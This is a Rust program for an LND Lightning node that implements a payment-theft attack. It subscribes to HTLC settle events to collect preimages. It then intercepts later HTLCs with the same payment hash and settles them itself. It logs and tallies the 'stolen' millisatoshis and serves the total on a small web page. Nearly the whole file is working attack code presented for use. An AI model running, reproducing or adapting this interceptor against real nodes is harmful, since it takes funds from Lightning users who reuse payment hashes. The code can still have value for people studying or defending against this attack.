// This program accepts four arguments: host, port, cert file, macaroon file

mod memory;
#[cfg(feature = "redis")]
mod redis;
#[cfg(feature = "sled")]
mod sled;
mod storage;

use axum::response::Html;
use axum::routing::get;
use axum::{Extension, Router};
use dioxus::prelude::*;
use std::sync::Arc;

use crate::memory::MemoryStorage;
#[cfg(feature = "redis")]
use crate::redis::RedisStorage;
#[cfg(feature = "sled")]
use crate::sled::SledStorage;

use crate::storage::Storage;
use sha2::Digest;
use sha2::Sha256;
use tokio::sync::Mutex;
use tokio::task::spawn;

#[tokio::main]
async fn main() {
    let mut args = std::env::args_os();
    args.next().expect("not even zeroth arg given");
    let host = args
        .next()
        .expect("missing arguments: host, port, cert file, macaroon file");
    let port = args
        .next()
        .expect("missing arguments: port, cert file, macaroon file");
    let cert_file = args
        .next()
        .expect("missing arguments: cert file, macaroon file");
    let macaroon_file = args.next().expect("missing argument: macaroon file");
    let host: String = host.into_string().expect("host is not UTF-8");
    let port: u32 = port
        .into_string()
        .expect("port is not UTF-8")
        .parse()
        .expect("port is not u32");
    let cert_file: String = cert_file.into_string().expect("cert_file is not UTF-8");
    let macaroon_file: String = macaroon_file
        .into_string()
        .expect("macaroon_file is not UTF-8");

    // Connecting to LND requires only host, port, cert file, macaroon file
    let mut client = tonic_openssl_lnd::connect(host, port, cert_file, macaroon_file)
        .await
        .expect("failed to connect");
    let client_router = client.router().clone();

    let info = client
        .lightning()
        // All calls require at least empty parameter
        .get_info(tonic_openssl_lnd::lnrpc::GetInfoRequest {})
        .await
        .expect("failed to get info")
        .into_inner();

    // We only print it here, note that in real-life code you may want to call `.into_inner()` on
    // the response to get the message.
    println!("{:#?}", info.alias);

    let storage = load_storage(args);

    // HTLC event stream part
    println!("starting htlc event subscription");
    let mut client_router_htlc_event = client_router.clone();
    let storage_htlc_event = storage.clone();
    spawn(async move {
        let mut htlc_event_stream = client_router_htlc_event
            .subscribe_htlc_events(tonic_openssl_lnd::routerrpc::SubscribeHtlcEventsRequest {})
            .await
            .expect("Failed to call subscribe_htlc_events")
            .into_inner();

        while let Some(htlc_event) = htlc_event_stream
            .message()
            .await
            .expect("Failed to receive invoices")
        {
            println!("{:#?}", htlc_event);
            if let Some(tonic_openssl_lnd::routerrpc::htlc_event::Event::SettleEvent(
                settle_event,
            )) = htlc_event.event
            {
                let mut hasher = Sha256::new();
                hasher.update(&settle_event.preimage);
                let payment_hash = hasher.finalize();
                println!(
                    "got preimage {} from payment hash {}",
                    hex::encode(settle_event.preimage.clone()),
                    hex::encode(payment_hash)
                );

                storage_htlc_event
                    .clone()
                    .lock()
                    .await
                    .set(settle_event.preimage, payment_hash.to_vec());
            };
        }
    });

    println!("started htlc event subscription");

    // HTLC interceptor part
    println!("starting HTLC interception");
    let storage_htlc_interceptor = storage.clone();
    spawn(async move {
        let mut client_router_htlc_intercept = client_router.clone();
        let (tx, rx) = tokio::sync::mpsc::channel::<
            tonic_openssl_lnd::routerrpc::ForwardHtlcInterceptResponse,
        >(1024);
        let stream = tokio_stream::wrappers::ReceiverStream::new(rx);

        let mut htlc_stream = client_router_htlc_intercept
            .htlc_interceptor(stream)
            .await
            .expect("Failed to call htlc_interceptor")
            .into_inner();

        while let Some(htlc) = htlc_stream
            .message()
            .await
            .expect("Failed to receive HTLCs")
        {
            println!("htlc {:?}", htlc);

            let map = storage_htlc_interceptor.clone();
            let mut db = map.lock().await;
            let response = match db.get(htlc.payment_hash) {
                Some(preimage) => {
                    let steal_amt = htlc.incoming_amount_msat;
                    println!("HTLC preimage saved! Stealing {steal_amt} msats...");

                    let total = db.add_stolen(steal_amt);
                    println!("New total amount stolen: {total} msats");

                    tonic_openssl_lnd::routerrpc::ForwardHtlcInterceptResponse {
                        incoming_circuit_key: htlc.incoming_circuit_key,
                        action: 0, // 0 settle, 1 fail, 2 resume
                        preimage: preimage.to_vec(),
                        failure_code: 0,
                        failure_message: vec![],
                    }
                }
                None => {
                    println!("Do not have HTLC preimage, resuming");
                    tonic_openssl_lnd::routerrpc::ForwardHtlcInterceptResponse {
                        incoming_circuit_key: htlc.incoming_circuit_key,
                        action: 2, // 0 settle, 1 fail, 2 resume
                        preimage: vec![],
                        failure_code: 0,
                        failure_message: vec![],
                    }
                }
            };

            tx.send(response).await.unwrap();
        }
    });

    println!("started htlc event interception");

    let stolen = storage.lock().await.total_stolen();
    println!("current amount stolen: {stolen} msats");

    // TODO make port configurable
    let addr = std::net::SocketAddr::from(([0, 0, 0, 0], 3000));
    println!("listening on http://{}", addr);

    let router = Router::new()
        .route("/", get(index))
        .route("/stolen", get(get_stolen))
        .layer(Extension(storage));

    axum::Server::bind(&addr)
        .serve(router.into_make_service())
        .await
        .unwrap();
}

// name this _args to keep clippy happy when it's unused
fn load_storage(mut _args: std::env::ArgsOs) -> Arc<Mutex<dyn Storage + Send>> {
    #[cfg(feature = "sled")]
    {
        return Arc::new(Mutex::new(parse_sled_config(_args)));
    }
    #[cfg(feature = "redis")]
    {
        return Arc::new(Mutex::new(parse_redis_config(_args)));
    }

    Arc::new(Mutex::new(MemoryStorage::new()))
}

#[cfg(feature = "sled")]
fn parse_sled_config(mut args: std::env::ArgsOs) -> SledStorage {
    match args.next() {
        Some(arg) => {
            let str = arg.into_string().expect("Failed to parse sled config arg");
            SledStorage::new(str.as_str()).expect("Failed to create sled storage")
        }
        None => SledStorage::default(),
    }
}

#[cfg(feature = "redis")]
fn parse_redis_config(mut args: std::env::ArgsOs) -> RedisStorage {
    match args.next() {
        Some(arg) => {
            let str = arg.into_string().expect("Failed to parse redis config arg");
            RedisStorage::new(str.as_str()).expect("Failed to create redis storage")
        }
        None => RedisStorage::default(),
    }
}

async fn index(Extension(stolen): Extension<Arc<Mutex<dyn Storage + Send>>>) -> Html<String> {
    let amt = stolen.lock().await.total_stolen();

    Html(dioxus::ssr::render_lazy(rsx! {
            h1 { "Total stolen: {amt} msats" }
    }))
}

async fn get_stolen(Extension(stolen): Extension<Arc<Mutex<dyn Storage + Send>>>) -> String {
    let amt = stolen.lock().await.total_stolen();
    amt.to_string()
}
